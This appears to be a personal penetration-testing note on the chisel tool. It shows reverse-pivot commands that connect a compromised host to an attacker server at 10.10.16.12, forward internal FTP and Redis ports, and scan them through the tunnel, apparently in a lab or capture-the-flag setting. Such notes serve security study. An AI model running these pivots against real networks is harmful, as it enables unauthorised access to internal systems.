# 💢 chisel
Tags: #💢
Related to:
See also:
Previous: [[Post Exploitation]], [[Tunneling & Exfiltration]]

## Description

A fast TCP/UDP tunnel, transported over HTTP, and secured via SSH.

"If you're familiar with SSH tunnels, chisel is everything reversed. SSH local, if you use chisel, you'll probably do everything reversed. With SSH you're the client, going through the firewall and talking to the SSH server. Use chisel in situations where you can't talk over SSH and you have to say, 'hey client, you have to talk to me and open up the tunnel.' With chisel, we are the server and we're talking to the client and routing through it, so we're doing a reverse pivot first. Reverse means the remote box is listening, and the remote box in this case is our box because we're running the command on their client." -IppSec

Here's a helpful guide: [^1]

## Usage Examples

### Download chisel binary from github repository.

We want to download chisel from the repository so it has a higher chance of running against the GLIBC version on our target.[^2]

 ### Reverse pivot

	chisel server -p 8000 -reverse -v					// 1. Server listens on 8000.	// NOTE THE FINGERPRINT
	./chisel client <kali_box>:8000 ...					// 2. Client connects to server.
	./chisel client <kali_box>:8000 R:8001:<target>:21	// 3. Client: "Hey, I've opened a hole for you (port 8001)"
	./chisel client 10.10.16.12:8000 R:8001:172.19.0.3:21
	
	./chisel client --fingerprint <server_fingerprint> 10.10.16.12:8000 R:127.0.0.1:8001:172.19.0.3:21
	
```
^ this is the secure way to run chisel. Using the server's fingerprint in the client ensures that only you are connecting to the server. Also, specifying 127.0.0.1 limits the tunnel to only people on the local host, not the entire network.
```

On our Kali box:

	ftp localhost 8001	// This accesses 172.19.0.3

```
220 ProFTPD Server (ProFTPD)
Name (localhost:kali):
```

	curl 127.0.0.1:8001

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
    <head>
		...
```

Restart our chisel client to open port 6379:

	./chisel client --fingerprint sw4f8cHIX6F/7wUx6dJ8V36X4MgxLcl4tOwymk+6NgI= 10.10.16.12:8000 R:127.0.0.1:6379:172.19.0.3:6379

	nmap -sT -sC -sV -p 6379 localhost

```
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 4.0.9

---
## References

<iframe width="560" height="315" src="https://www.youtube.com/embed/Yp4oxoQIBAM" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

[^1]: https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html
[^2]: https://github.com/jpillora/chisel/releases/
